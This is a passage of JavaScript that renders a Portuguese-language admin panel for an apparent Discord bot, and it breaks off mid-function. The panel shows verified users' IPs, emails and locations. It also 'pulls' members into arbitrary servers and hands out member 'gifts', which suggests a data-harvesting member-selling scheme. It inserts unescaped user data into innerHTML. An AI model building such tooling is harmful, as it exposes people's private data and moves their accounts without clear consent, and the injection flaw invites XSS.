function renderPainel() {
    return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        :root {
            --bg: #0f1115;
            --card: #1a1d24;
            --card-hover: #22262f;
            --border: #2a2e38;
            --text: #e6e8eb;
            --text-muted: #8a8f99;
            --primary: #5865F2;
            --primary-hover: #4752c4;
            --success: #3ba55d;
            --danger: #ed4245;
            --warning: #faa81a;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
        }

        /* LOGIN */
        .login-container { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .login-box { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 40px; width: 100%; max-width: 380px; }
        .login-box h1 { font-size: 22px; margin-bottom: 8px; text-align: center; }
        .login-box p { color: var(--text-muted); font-size: 14px; text-align: center; margin-bottom: 28px; }
        .login-box input { width: 100%; padding: 12px 14px; background: var(--bg); border: 1px solid var(--border); border-radius: 8px; color: var(--text); font-size: 14px; font-family: inherit; margin-bottom: 12px; outline: none; }
        .login-box input:focus { border-color: var(--primary); }
        .login-box button { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit; }
        .login-box button:hover { background: var(--primary-hover); }
        .login-erro { color: var(--danger); font-size: 13px; text-align: center; margin-top: 12px; min-height: 18px; }

        /* APP */
        .app { display: none; min-height: 100vh; }
        .app.ativo { display: flex; }

        .sidebar { width: 240px; background: var(--card); border-right: 1px solid var(--border); padding: 24px 16px; display: flex; flex-direction: column; position: fixed; height: 100vh; overflow-y: auto; }
        .sidebar-logo { font-size: 16px; font-weight: 700; padding: 0 8px 24px; border-bottom: 1px solid var(--border); margin-bottom: 16px; }
        .sidebar-logo span { color: var(--primary); }
        .sidebar-nav { display: flex; flex-direction: column; gap: 4px; flex: 1; }
        .nav-item { display: flex; align-items: center; gap: 10px; padding: 10px 12px; border-radius: 8px; color: var(--text-muted); font-size: 14px; cursor: pointer; text-decoration: none; border: none; background: transparent; font-family: inherit; width: 100%; text-align: left; }
        .nav-item:hover { background: var(--card-hover); color: var(--text); }
        .nav-item.ativo { background: var(--primary); color: white; }
        .sidebar-footer { padding-top: 16px; border-top: 1px solid var(--border); }
        .btn-sair { padding: 8px 16px; background: transparent; color: var(--danger); border: 1px solid var(--danger); border-radius: 6px; font-size: 13px; cursor: pointer; font-family: inherit; width: 100%; }
        .btn-sair:hover { background: var(--danger); color: white; }

        .main { flex: 1; margin-left: 240px; padding: 32px; max-width: calc(100% - 240px); }
        .main-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
        .main-header h1 { font-size: 24px; }
        .main-header .user-info { color: var(--text-muted); font-size: 13px; }

        /* CARDS */
        .cards-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin-bottom: 32px; }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; }
        .card-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
        .card-value { font-size: 28px; font-weight: 700; }
        .card-value.primary { color: var(--primary); }
        .card-value.success { color: var(--success); }
        .card-value.warning { color: var(--warning); }

        /* TABELAS */
        .tabela-container { background: var(--card); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin-bottom: 24px; }
        .tabela-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; gap: 12px; flex-wrap: wrap; }
        .tabela-header h2 { font-size: 16px; }
        .busca-input { padding: 8px 12px; background: var(--bg); border: 1px solid var(--border); border-radius: 6px; color: var(--text); font-size: 13px; outline: none; width: 240px; font-family: inherit; }
        .busca-input:focus { border-color: var(--primary); }
        .tabela-scroll { overflow-x: auto; }

        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; padding: 12px 20px; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); border-bottom: 1px solid var(--border); font-weight: 600; white-space: nowrap; }
        td { padding: 12px 20px; font-size: 13px; border-bottom: 1px solid var(--border); }
        tr:last-child td { border-bottom: none; }
        tr:hover td { background: var(--card-hover); }

        .avatar-cell { display: flex; align-items: center; gap: 10px; }
        .avatar-cell img { width: 32px; height: 32px; border-radius: 50%; }
        .avatar-cell .nome { font-weight: 500; }
        .avatar-cell .id { font-size: 11px; color: var(--text-muted); }

        .btn-acao { padding: 5px 10px; border-radius: 5px; border: none; font-size: 12px; cursor: pointer; font-family: inherit; }
        .btn-acao.danger { background: transparent; color: var(--danger); border: 1px solid var(--danger); }
        .btn-acao.danger:hover { background: var(--danger); color: white; }

        /* FORM */
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 13px; color: var(--text-muted); margin-bottom: 6px; }
        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 10px 12px; background: var(--bg); border: 1px solid var(--border); border-radius: 6px; color: var(--text); font-size: 13px; outline: none; font-family: inherit; }
        .form-group input:focus, .form-group select:focus { border-color: var(--primary); }
        .form-group select[multiple] { padding: 6px; }
        .form-group select[multiple] option { padding: 6px 8px; border-radius: 4px; }

        .btn-primary { padding: 10px 20px; background: var(--primary); color: white; border: none; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit; }
        .btn-primary:hover { background: var(--primary-hover); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }

        /* TOAST */
        .toast { position: fixed; bottom: 24px; right: 24px; background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 14px 20px; font-size: 13px; box-shadow: 0 8px 24px rgba(0,0,0,0.4); transform: translateY(100px); opacity: 0; transition: all 0.3s; z-index: 9999; max-width: 320px; }
        .toast.ativo { transform: translateY(0); opacity: 1; }
        .toast.sucesso { border-color: var(--success); color: var(--success); }
        .toast.erro { border-color: var(--danger); color: var(--danger); }

        /* PÁGINAS */
        .pagina { display: none; }
        .pagina.ativo { display: block; }

        /* RESULTADO */
        .resultado-box { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-top: 16px; font-size: 13px; line-height: 1.6; }
        .resultado-box.sucesso { border-color: var(--success); }
        .resultado-box.erro { border-color: var(--danger); }

        /* BADGE */
        .badge { display: inline-block; padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: 600; }
        .badge.success { background: rgba(59,165,93,0.15); color: var(--success); }
        .badge.danger { background: rgba(237,66,69,0.15); color: var(--danger); }
        .badge.warning { background: rgba(250,168,26,0.15); color: var(--warning); }

        /* MOBILE */
        .menu-toggle { display: none; position: fixed; top: 16px; left: 16px; z-index: 1000; background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 10px 14px; border-radius: 8px; cursor: pointer; font-size: 18px; }

        @media (max-width: 768px) {
            .menu-toggle { display: block; }
            .sidebar { transform: translateX(-100%); transition: transform 0.3s; z-index: 999; }
            .sidebar.aberto { transform: translateX(0); }
            .main { margin-left: 0; max-width: 100%; padding: 72px 16px 24px; }
            .busca-input { width: 100%; }
            .ocultar-mobile { display: none; }
            .main-header h1 { font-size: 18px; }
        }
    </style>
</head>
<body>

    <!-- LOGIN -->
    <div class="login-container" id="loginContainer">
        <div class="login-box">
            <h1>🔐 Painel Admin</h1>
            <p>Faça login pra continuar</p>
            <input type="text" id="loginUsuario" placeholder="Usuário" autocomplete="username">
            <input type="password" id="loginSenha" placeholder="Senha" autocomplete="current-password">
            <button onclick="fazerLogin()">Entrar</button>
            <div class="login-erro" id="loginErro"></div>
        </div>
    </div>

    <!-- APP -->
    <div class="app" id="app">
        <button class="menu-toggle" onclick="toggleSidebar()">☰</button>

        <aside class="sidebar" id="sidebar">
            <div class="sidebar-logo">Fuzion <span>Painel</span></div>
            <nav class="sidebar-nav">
                <button class="nav-item ativo" data-pagina="dashboard" onclick="mostrarPagina('dashboard')">📊 Dashboard</button>
                <button class="nav-item" data-pagina="verificados" onclick="mostrarPagina('verificados')">👥 Lista Verificados</button>
                <button class="nav-item" data-pagina="criar-gift" onclick="mostrarPagina('criar-gift')">🎁 Criar Gift</button>
                <button class="nav-item" data-pagina="deletar-gift" onclick="mostrarPagina('deletar-gift')">🗑️ Deletar Gift</button>
                <button class="nav-item" data-pagina="puxar" onclick="mostrarPagina('puxar')">🚀 Puxar Membros</button>
                <button class="nav-item" data-pagina="servidores" onclick="mostrarPagina('servidores')">🌐 Servidores</button>
                <button class="nav-item" data-pagina="logs" onclick="mostrarPagina('logs')">📝 Logs</button>
                <button class="nav-item" data-pagina="config" onclick="mostrarPagina('config')">⚙️ Config</button>
            </nav>
            <div class="sidebar-footer">
                <button class="btn-sair" onclick="fazerLogout()">Sair</button>
            </div>
        </aside>

        <main class="main">
            <div class="main-header">
                <h1 id="tituloPagina">📊 Dashboard</h1>
                <div class="user-info">Logado como <strong>Pedro</strong></div>
            </div>

            <!-- DASHBOARD -->
            <div class="pagina ativo" id="pagina-dashboard">
                <div class="cards-grid" id="cardsStats"></div>
                <div class="tabela-container">
                    <div class="tabela-header"><h2>🏆 Top 5 Cidades</h2></div>
                    <div class="tabela-scroll">
                        <table>
                            <thead><tr><th>#</th><th>Cidade</th><th>Usuários</th></tr></thead>
                            <tbody id="topCidades"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- VERIFICADOS -->
            <div class="pagina" id="pagina-verificados">
                <div class="tabela-container">
                    <div class="tabela-header">
                        <h2>👥 Verificados (<span id="totalVerificados">0</span>)</h2>
                        <input type="text" class="busca-input" id="buscaVerificados" placeholder="🔍 Buscar..." oninput="filtrarVerificados()">
                    </div>
                    <div class="tabela-scroll">
                        <table>
                            <thead>
                                <tr>
                                    <th>Usuário</th>
                                    <th class="ocultar-mobile">Localização</th>
                                    <th class="ocultar-mobile">Email</th>
                                    <th class="ocultar-mobile">IP</th>
                                    <th class="ocultar-mobile">Data</th>
                                    <th>Ações</th>
                                </tr>
                            </thead>
                            <tbody id="tabelaVerificados"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- CRIAR GIFT -->
            <div class="pagina" id="pagina-criar-gift">
                <div class="tabela-container" style="padding:24px">
                    <h2 style="margin-bottom:20px">🎁 Criar Gift</h2>
                    <div class="form-group">
                        <label>Quantidade de membros</label>
                        <input type="number" id="giftQuantidade" min="1" placeholder="Ex: 5">
                    </div>
                    <div class="form-group">
                        <label>Tempo de expiração</label>
                        <select id="giftTempo">
                            <option value="1">1 hora</option>
                            <option value="6">6 horas</option>
                            <option value="24">24 horas</option>
                            <option value="168" selected>7 dias</option>
                            <option value="720">30 dias</option>
                            <option value="0">Nunca expira</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label><input type="checkbox" id="giftSelecionar" onchange="toggleSelecionarUsuarios()"> Selecionar usuários específicos (opcional)</label>
                    </div>
                    <div class="form-group" id="containerUsuarios" style="display:none">
                        <label>Usuários (Ctrl+clique pra selecionar vários)</label>
                        <select id="giftUsuarios" multiple style="height:200px"></select>
                    </div>
                    <button class="btn-primary" onclick="criarGift()" id="btnCriarGift">Criar Gift</button>
                    <div id="resultadoGift"></div>
                </div>
            </div>

            <!-- DELETAR GIFT -->
            <div class="pagina" id="pagina-deletar-gift">
                <div class="tabela-container">
                    <div class="tabela-header"><h2>🗑️ Gifts Criados</h2></div>
                    <div class="tabela-scroll">
                        <table>
                            <thead><tr><th>Código</th><th>Quantidade</th><th>Status</th><th>Expira</th><th>Ações</th></tr></thead>
                            <tbody id="tabelaGifts"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- PUXAR -->
            <div class="pagina" id="pagina-puxar">
                <div class="tabela-container" style="padding:24px">
                    <h2 style="margin-bottom:20px">🚀 Puxar Membros</h2>
                    <div class="form-group">
                        <label>ID do servidor de destino</label>
                        <input type="text" id="puxarGuildId" placeholder="Ex: 1234567890123456789" maxlength="20">
                    </div>
                    <div class="form-group">
                        <label>Quantidade (0 = todos)</label>
                        <input type="number" id="puxarQuantidade" min="0" value="0">
                    </div>
                    <button class="btn-primary" onclick="puxarMembros()" id="btnPuxar">Puxar Membros</button>
                    <div id="resultadoPuxar"></div>
                </div>
            </div>

            <!-- SERVIDORES -->
            <div class="pagina" id="pagina-servidores">
                <div class="tabela-container">
                    <div class="tabela-header"><h2>🌐 Servidores do Bot</h2></div>
                    <div class="tabela-scroll">
                        <table>
                            <thead><tr><th>Servidor</th><th>ID</th><th class="ocultar-mobile">Membros</th><th class="ocultar-mobile">Dono</th></tr></thead>
                            <tbody id="tabelaServidores"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- LOGS -->
            <div class="pagina" id="pagina-logs">
                <div class="tabela-container">
                    <div class="tabela-header">
                        <h2>📝 Logs do Servidor</h2>
                        <select class="busca-input" id="filtroLogs" onchange="filtrarLogs()">
                            <option value="todos">Todos</option>
                            <option value="entrou">Entrou</option>
                            <option value="saiu">Saiu</option>
                            <option value="ban">Ban</option>
                            <option value="kick">Kick</option>
                            <option value="mute">Mute</option>
                            <option value="unmute">Unmute</option>
                            <option value="verificacao">Verificação</option>
                            <option value="gift">Gift</option>
                        </select>
                    </div>
                    <div class="tabela-scroll">
                        <table>
                            <thead><tr><th>Data</th><th>Tipo</th><th>Usuário</th><th class="ocultar-mobile">Detalhes</th></tr></thead>
                            <tbody id="tabelaLogs"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- CONFIG -->
            <div class="pagina" id="pagina-config">
                <div class="tabela-container" style="padding:24px">
                    <h2 style="margin-bottom:20px">⚙️ Configurações</h2>
                    <div class="form-group">
                        <label>Canal de logs de verificação (ID)</label>
                        <input type="text" id="cfgLogChannel" placeholder="ID do canal">
                    </div>
                    <div class="form-group">
                        <label>Canal de logs de gift (ID)</label>
                        <input type="text" id="cfgGiftLogChannel" placeholder="ID do canal">
                    </div>
                    <div class="form-group">
                        <label>Cargo de verificado (ID)</label>
                        <input type="text" id="cfgRoleId" placeholder="ID do cargo">
                    </div>
                    <button class="btn-primary" onclick="salvarConfig()" id="btnSalvarConfig">Salvar</button>
                    <div id="resultadoConfig"></div>
                </div>
            </div>
        </main>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        let TOKEN = localStorage.getItem('painel_token');
        let CSRF = localStorage.getItem('painel_csrf');
        let USUARIOS_CACHE = [];
        let GIFTS_CACHE = [];
        let LOGS_CACHE = [];

        // ============================
        // HELPERS
        // ============================
        async function api(url, options = {}) {
            const opts = {
                ...options,
                headers: {
                    'Content-Type': 'application/json',
                    'x-painel-token': TOKEN,
                    'x-csrf-token': CSRF,
                    ...(options.headers || {})
                }
            };
            const resp = await fetch(url, opts);
            if (resp.status === 401) {
                fazerLogout();
                throw new Error('Sessão expirada');
            }
            return resp;
        }

        function toast(msg, tipo = 'sucesso') {
            const el = document.getElementById('toast');
            el.textContent = msg;
            el.className = 'toast ativo ' + tipo;
            setTimeout(() => el.className = 'toast ' + tipo, 3000);
        }

        function formatarData(iso) {
            if (!iso) return '-';
            return new Date(iso).toLocaleString('pt-BR');
        }

        // ============================
        // LOGIN
        // ============================
        async function fazerLogin() {
            const usuario = document.getElementById('loginUsuario').value.trim();
            const senha = document.getElementById('loginSenha').value;
            const erro = document.getElementById('loginErro');
            erro.textContent = '';

            if (!usuario || !senha) {
                erro.textContent = 'Preencha usuário e senha.';
                return;
            }

            try {
                const resp = await fetch('/api/painel/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ usuario, senha })
                });
                const data = await resp.json();

                if (!resp.ok) {
                    erro.textContent = data.error || 'Erro ao fazer login.';
                    return;
                }

                TOKEN = data.token;
                CSRF = data.csrf;
                localStorage.setItem('painel_token', TOKEN);
                localStorage.setItem('painel_csrf', CSRF);

                abrirApp();
            } catch (err) {
                erro.textContent = 'Erro de conexão.';
            }
        }

        async function fazerLogout() {
            try { await api('/api/painel/logout', { method: 'POST' }); } catch (e) {}
            localStorage.removeItem('painel_token');
            localStorage.removeItem('painel_csrf');
            TOKEN = null; CSRF = null;
            location.reload();
        }

        function abrirApp() {
            document.getElementById('loginContainer').style.display = 'none';
            document.getElementById('app').classList.add('ativo');
            carregarTudo();
        }

        // ============================
        // NAVEGAÇÃO
        // ============================
        function mostrarPagina(pagina) {
            document.querySelectorAll('.pagina').forEach(p => p.classList.remove('ativo'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('ativo'));
            document.getElementById('pagina-' + pagina).classList.add('ativo');
            document.querySelector(\`[data-pagina="\${pagina}"]\`).classList.add('ativo');

            const titulos = {
                'dashboard': '📊 Dashboard',
                'verificados': '👥 Lista Verificados',
                'criar-gift': '🎁 Criar Gift',
                'deletar-gift': '🗑️ Deletar Gift',
                'puxar': '🚀 Puxar Membros',
                'servidores': '🌐 Servidores',
                'logs': '📝 Logs',
                'config': '⚙️ Config'
            };
            document.getElementById('tituloPagina').textContent = titulos[pagina] || '';

            if (pagina === 'verificados') carregarVerificados();
            if (pagina === 'deletar-gift') carregarGifts();
            if (pagina === 'servidores') carregarServidores();
            if (pagina === 'logs') carregarLogs();
            if (pagina === 'config') carregarConfig();
            if (pagina === 'criar-gift') carregarUsuariosSelect();

            document.getElementById('sidebar').classList.remove('aberto');
        }

        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('aberto');
        }

        // ============================
        // CARREGAR TUDO
        // ============================
        async function carregarTudo() {
            await carregarStats();
        }

        async function carregarStats() {
            try {
                const resp = await api('/api/painel/stats');
                const data = await resp.json();

                document.getElementById('cardsStats').innerHTML = \`
                    <div class="card"><div class="card-label">Verificados</div><div class="card-value primary">\${data.total}</div></div>
                    <div class="card"><div class="card-label">Gifts Ativos</div><div class="card-value success">\${data.giftsAtivos}</div></div>
                    <div class="card"><div class="card-label">Gifts Usados</div><div class="card-value warning">\${data.giftsUsados}</div></div>
                    <div class="card"><div class="card-label">Servidores</div><div class="card-value">\${data.servidores}</div></div>
                \`;

                document.getElementById('topCidades').innerHTML = data.topCidades.map((c, i) => \`
                    <tr><td>\${i + 1}</td><td>\${c.cidade}</td><td>\${c.count}</td></tr>
                \`).join('') || '<tr><td colspan="3">Sem dados</td></tr>';
            } catch (err) {
                toast('Erro ao carregar stats', 'erro');
            }
        }

        // ============================
        // VERIFICADOS
        // ============================
        async function carregarVerificados() {
            try {
                const resp = await api('/api/painel/users');
                USUARIOS_CACHE = await resp.json();
                renderVerificados(USUARIOS_CACHE);
            } catch (err) {
                toast('Erro ao carregar usuários', 'erro');
            }
        }

        function renderVerificados(users) {
            document.getElementById('totalVerificados').textContent = users.length;
            const tbody = document.getElementById('tabelaVerificados');

            if (users.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:#8a8f99">Nenhum verificado</td></tr>';
                return;
            }

            tbody.innerHTML = users.map(u => {
                const avatar = u.avatar
                    ? \`https://cdn.discordapp.com/avatars/\${u.id}/\${u.avatar}.png\`
                    : \`https://cdn.discordapp.com/embed/avatars/0.png\`;
                return \`
                    <tr>
                        <td>
                            <div class="avatar-cell">
                                <img src="\${avatar}" alt="">
                                <div>
                                    <div class="nome">\${u.username}</div>
                                    <div class="id">\${u.id}</div>
                                </div>
                            </div>
                        </td>
                        <td class="ocultar-mobile">\${u.cidade}, \${u.estado} - \${u.pais}</td>
                        <td class="ocultar-mobile">\${u.email || '-'}</td>
                        <td class="ocultar-mobile">\${u.ip || '-'}</td>
                        <td class="ocultar-mobile">\${formatarData(u.verifiedAt)}</td>
                        <td><button class="btn-acao danger" onclick="desverificar('\${u.id}')">Desverificar</button></td>
                    </tr>
                \`;
            }).join('');
        }

        function filtrarVerificados() {
            const busca = document.getElementById('buscaVerificados').value.toLowerCase();
            const filtrados = USUARIOS_CACHE.filter(u =>
                u.username.toLowerCase().includes(busca) || u.id.includes(busca)
            );
            renderVerificados(filtrados);
        }

        async function desverificar(id) {
            if (!confirm('Tem certeza que quer desverificar esse usuário?')) return;
            try {
                const resp = await api('/api/painel/users/' + id, { method: 'DELETE' });
                if (resp.ok) {
                    toast('Usuário desverificado!');
                    carregarVerificados();
                } else {
                    toast('Erro ao desverificar', 'erro');
                }
            } catch (err) {
                toast('Erro de conexão', 'erro');
            }
        }

        // ============================
        // CRIAR GIFT
        // ============================
        async function carregarUsuariosSelect() {
            try {
                const resp = await api('/api/painel/users');
                const users = await resp.json();
                const select = document.getElementById('giftUsuarios');
                select.innerHTML = users.map(u => \`<option value="\${u.id}">\${u.username} (\${u.id})</option>\`).join('');
            } catch (err) {}
        }

        function toggleSelecionarUsuarios() {
            const check = document.getElementById('giftSelecionar').checked;
            document.getElementById('containerUsuarios').style.display = check ? 'block' : 'none';
        }

        async function criarGift() {
            const quantidade = parseInt(document.getElementById('giftQuantidade').value);
            const tempo = parseInt(document.getElementById('giftTempo').value);
            const selecionados = Array.from(document.getElementById('giftUsuarios').selectedOptions).map(o => o.value);
            const btn = document.getElementById('btnCriarGift');
            const resultado = document.getElementById('resultadoGift');

            if (!quantidade || quantidade < 1) {
                toast('Informe uma quantidade válida', 'erro');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Criando...';
            resultado.innerHTML = '';

            try {
                const resp = await api('/api/painel/gifts', {
                    method: 'POST',
                    body: JSON.stringify({ quantidade, tempo, selecionados })
                });

                const data = await resp.json();

                if (!resp.ok) {
                    resultado.innerHTML = \`<div class="resultado-box erro">❌ \${data.error}</div>\`;
                    btn.disabled = false;
                    btn.textContent = 'Criar Gift';
                    return;
                }

                resultado.innerHTML = \`<div class="resultado-box sucesso">
                    ✅ Gift criado!<br><br>
                    <strong>Código:</strong> <code>\${data.codigo}</code><br>
                    <strong>Link:</strong> <a href="\${data.link}" target="_blank" style="color:#5865F2">\${data.link}</a>
                </div>\`;

                toast('Gift criado!');
                btn.disabled = false;
                btn.textContent = 'Criar Gift';
                document.getElementById('giftQuantidade').value = '';
            } catch (err) {
                resultado.innerHTML = '<div class="resultado-box erro">❌ Erro de conexão</div>';
                btn.disabled = false;
                btn.textContent = 'Criar Gift';
            }
        }

        // ============================
        // DELETAR GIFT
        // ============================
        async function carreg